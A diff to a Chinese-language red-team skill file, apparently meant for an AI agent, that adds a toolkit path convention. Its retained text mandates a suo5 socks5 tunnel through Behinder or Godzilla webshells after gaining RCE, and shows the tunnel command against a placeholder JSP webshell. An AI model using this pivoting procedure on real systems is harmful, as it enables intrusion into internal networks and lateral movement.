@@ -6,6 +6,10 @@ role: internal
 enabled: true
 ---
 
+> **路径约定**：下文的 `${TOOLKIT}` 指工具根目录 `$DSH_HOME/redteam/toolkit`（可在演练台「环境适配」里改）。
+> 工具一律放 `${TOOLKIT}/<工具名>/`，不要散落到 PATH 或 `~/.local/bin`。
+> 缺什么工具、装到哪、官方获取命令：跑 `redteam_preflight`，或看仓库 `docs/TOOLKIT.md`。
+
 # suo5 内网隧道
 
 > **打进内网的标准通道只有这一条**：拿到 WebShell/RCE 后**必须**先用 suo5 建 socks5 隧道，
@@ -13,11 +17,11 @@ enabled: true
 > 然后才谈内网测绘与横向。**没有隧道就不要手搓内网探测脚本**——手搓既慢又容易把入口打死。
 > 隧道入口的 WebShell 必须是冰蝎马/哥斯拉马（见技能 `webshell-toolkit`），否则用户无法复用。
 
-二进制：`$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）
+二进制：`${TOOLKIT}/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）
 
 ## 建立隧道
 ```bash
-SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64
+SUO5=${TOOLKIT}/suo5/suo5-linux-amd64
 
 # 1) 用 WebShell 作为隧道端点（HTTP 型）
 $SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5
